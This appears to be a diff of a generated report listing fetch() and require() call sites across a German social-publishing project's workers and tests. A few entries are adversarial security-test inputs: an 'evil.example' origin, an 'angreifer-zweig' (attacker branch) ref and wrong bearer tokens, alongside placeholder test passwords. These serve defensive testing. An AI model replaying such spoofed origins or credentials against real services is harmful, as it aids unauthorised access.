+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/social/meta/status"), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/social/meta/status" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/"), env)).status, 401) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/" + adminQuery), env)).status, 200) ` |
+| workers/vision-universe-social/tests/approval-session.test.mjs | ` fetch(request("/gibtesnicht" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(INHALTE), env) ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({ ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({ approval: await freigabeFuer(INHALTE) }, INHALTE)), env) ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(INHALTE), env) ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({ ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({ ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({}, INHALTE, { ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({}, INHALTE, { ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({}, INHALTE, { ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(request("/social/meta/publish", { ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({ ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({ approval: freigabe }, INHALTE)), env) ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({ approval: freigabe }, INHALTE)), env) ` |
+| workers/vision-universe-social/tests/approval.test.mjs | ` fetch(ruf(Object.assign({ ` |
+| workers/vision-universe-social/tests/asset-fingerprint.test.mjs | ` fetch(request("/social/meta/publish", { ` |
+| workers/vision-universe-social/tests/harness.mjs | ` fetch(     request("/social/meta/connect?key=" + encodeURIComponent(env.VU_SOCIAL_ADMIN_KEY)), env) ` |
+| workers/vision-universe-social/tests/harness.mjs | ` fetch(request( ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability"), env) ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request( ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/hashtag-capability.test.mjs | ` fetch(request("/social/meta/hashtag-capability", ` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(request("/social/meta/insights"), env) ` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(     request("/social/meta/insights", { method: "POST", ` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env)).json() `` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env) `` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(ruf(), env)).json() ` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env)).json() `` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env)).json() `` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env)).json() `` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env)).json() `` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env)).json() `` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env) `` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${viele}`), env)).json() `` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(ruf("?media=1,2,3"), env)).json() ` |
+| workers/vision-universe-social/tests/insights.test.mjs | `` fetch(ruf(`?media=${MEDIA}`), env)).json() `` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(ruf("?media=1,2,3,4,5"), env)).json() ` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(request("/health"), env)).json() ` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(request("/health"), env)).json() ` |
+| workers/vision-universe-social/tests/insights.test.mjs | ` fetch(request("/health"), env) ` |
+| workers/vision-universe-social/tests/manual-run-adversarial.test.mjs | ` fetch(request("/approval/session", { ` |
+| workers/vision-universe-social/tests/manual-run-adversarial.test.mjs | ` fetch(request("/approval/run", Object.assign({ ` |
+| workers/vision-universe-social/tests/manual-run-adversarial.test.mjs | ` fetch(request("/approval/run?ref=angreifer-zweig", { ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request("/health"), {}) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request(path), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request("/social/meta/status?key=zu-kurz"), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request("/social/meta/connect" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request("/social/meta/callback"), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(     request("/social/meta/callback?error=access_denied&error_description=User+denied"), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request( ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request( ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request( ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request("/social/meta/status" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request("/social/meta/verify" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request("/social/meta/verify" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(request("/social/meta/disconnect" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/oauth.test.mjs | ` fetch(     request("/social/meta/disconnect" + adminQuery, { method: "POST" }), env) ` |
+| workers/vision-universe-social/tests/owner-configuration.test.mjs | ` fetch(     request("/social/meta/connect?key=" + encodeURIComponent(TEST_ADMIN_KEY)), env) ` |
+| workers/vision-universe-social/tests/profile.test.mjs | ` fetch(request("/social/meta/profile"), env)).status, 401) ` |
+| workers/vision-universe-social/tests/profile.test.mjs | ` fetch(ruf("", { method: "POST" }), env)).status, 405) ` |
+| workers/vision-universe-social/tests/profile.test.mjs | ` fetch(ruf("?limit=2"), env) ` |
+| workers/vision-universe-social/tests/profile.test.mjs | ` fetch(ruf(), env)).status, 409) ` |
+| workers/vision-universe-social/tests/profile.test.mjs | ` fetch(ruf(), env)).status, 403) ` |
+| workers/vision-universe-social/tests/profile.test.mjs | ` fetch(ruf("?limit=500&after=ABC"), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(     request("/social/meta/publish", { method: "POST", body: JSON.stringify(NORMAL) }), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(null, "GET"), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf({ imageUrl: BILD }), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf({ contentId: INHALT }), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf({ contentId: INHALT, imageUrl: BILD, caption: text }), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(     ruf({ contentId: "vu-content-2026-09-16-002", imageUrl: BILD, caption: "Zwei." }), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/publish-idempotent.test.mjs | ` fetch(ruf(NORMAL), env) ` |
+| workers/vision-universe-social/tests/reel-background.test.mjs | ` fetch(request("/approval/session", { method: "POST", ` |
+| workers/vision-universe-social/tests/reel-background.test.mjs | ` fetch(request(pfad, { method: "POST", ` |
+| workers/vision-universe-social/tests/reel-background.test.mjs | ` fetch(post("/social/reel/prepare", { contentId: INHALT, videoUrl: VIDEO, caption: TEXT }), env) ` |
+| workers/vision-universe-social/tests/reel-background.test.mjs | `` fetch(request(`/approval/${prep.candidateId}`, { headers: { cookie } }), env)).text() `` |
+| workers/vision-universe-social/tests/reel-background.test.mjs | ` fetch(post("/social/reel/prepare", { contentId: INHALT, videoUrl: VIDEO, caption: TEXT }), env) ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(post("/social/reel/prepare", ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(post("/social/meta/publish", Object.assign({ ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/social/reel/prepare", { method: "POST", body: "{}" }), env)).status, 401) ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/social/reel/prepare" + KEY), env)).status, 405) ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(post("/social/meta/publish", { contentId: INHALT, mediaType: "REELS", videoUrl: VIDEO, caption: TEXT }), env) ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/social/meta/publish", { method: "POST", body: "{}" }), env) ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/approval/session", { method: "POST", ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request(pfad, { method: "POST", ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/approval/" + prep.candidateId, { headers: { cookie } }), env) ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/social/reel/status?contentId=" + INHALT), env)).status, 401) ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/social/reel/status" + KEY + "&contentId=" + INHALT), env)).json() ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/social/reel/status" + KEY + "&contentId=" + INHALT), env)).json() ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/social/reel/status" + KEY + "&contentId=" + INHALT), env)).json() ` |
+| workers/vision-universe-social/tests/reel.test.mjs | ` fetch(request("/social/reel/status" + KEY + "&contentId=" + INHALT), env)).json() ` |
+| workers/vision-universe-social/tests/reel.test.mjs | `` fetch(request(`/approval/${prep.candidateId}`, { headers: { cookie } }), env) `` |
+| workers/vision-universe-social/tests/security.test.mjs | ` fetch(request("/social/meta/verify" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/security.test.mjs | ` fetch(request("/social/meta/status" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/security.test.mjs | ` fetch(request("/social/meta/status" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/security.test.mjs | ` fetch(request("/social/meta/gibtesnicht" + adminQuery), env) ` |
+| workers/vision-universe-social/tests/security.test.mjs | ` fetch(     request("/social/meta/connect" + adminQuery, { method: "POST" }), env) ` |
+| workers/vision-universe-social/tests/security.test.mjs | ` fetch(request("/health"), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(""), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | `` fetch(     request(`/social/meta/smoke-publish?confirm=${CONFIRM}`, { method: "POST" }), env) `` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | `` fetch(ruf(`?confirm=${CONFIRM}`, "GET"), env) `` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | `` fetch(ruf(`?confirm=${CONFIRM}&again=${AGAIN}`), env) `` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | `` fetch(     request("/social/meta/status", { headers: { authorization: `Bearer ${TEST_ADMIN_KEY}` } }), `` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(request("/social/meta/status"), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | ` fetch(ruf(), env) ` |
+| workers/vision-universe-social/tests/smoke-publish.test.mjs | `` fetch(ruf(`&again=${AGAIN}`), env2) `` |
+| workers/vu-account/src/index.mjs | ` fetch(request, env) { ` |
+| workers/vu-account/tests/backtests.test.mjs | ` require(path.join(ROOT, 'scripts/quant/research/export-backtest-review-bundle.cjs')) ` |
+| workers/vu-account/tests/backtests.test.mjs | ` require(path.join(ROOT, 'scripts/quant/research/backtest-spec-builder.cjs')) ` |
+| workers/vu-account/tests/backtests.test.mjs | ` require(path.join(ROOT, 'scripts/quant/research/build-backtest-catalog.cjs')) ` |
+| workers/vu-account/tests/backtests.test.mjs | ` require(path.join(ROOT, 'scripts/quant/research/backtest-runner.cjs')) ` |
+| workers/vu-account/tests/backtests.test.mjs | ` require(path.join(ROOT, 'scripts/quant/portfolio/export-model-portfolios-bundle.cjs')) ` |
+| workers/vu-ask/src/gate.mjs | ` fetch(...a)) ` |
+| workers/vu-ask/src/gate.mjs | ` fetch(request) { ` |
+| workers/vu-ask/src/index.mjs | ` fetch(request, env) { ` |
+| workers/vu-ask/src/index.mjs | ` fetch("https://gate" + path, { ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://gate/ask", { ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request(u, init)) }) } } ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/ask", { method: "POST", headers: { origin: "https://evil.example" }, body: "{}" }), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/admin/report", { headers: { authorization: "Bearer falsch" } }), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/admin/report", { headers: { authorization: "Bearer admin-geheim" } }), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/ask", { method: "POST", headers: { origin: "https://research.visionuniverse.de" }, body: "x".repeat(9000) }), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/ask", { ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(req(), env)).status, 401) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(req("falsch"), env)).status, 401) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/quota?client=x", { headers: { "x-vu-access": "falsch" } }), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(req("VU-TEST-PASS-WORT"), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/ask", { method: "OPTIONS", headers: { origin: "https://research.visionuniverse.de" } }), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/quota?client=x", { headers: { "x-vu-access": "mein-passwort" } }), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://ask.example/v1/quota?client=x", { headers: { "x-vu-access": "admin-geheim" } }), env) ` |
+| workers/vu-ask/tests/vu-ask.test.mjs | ` fetch(new Request("https://gate/ask", { method: "POST", headers: { "x-vu-ip": "1.2.3.4" }, ` |
 
 Textquellen über 4 MiB oder Symlinks werden nicht gelesen und hier offengelegt; Datenverzeichnisse und der erzeugte Bericht werden grundsätzlich nicht als Quellen gelesen.
 
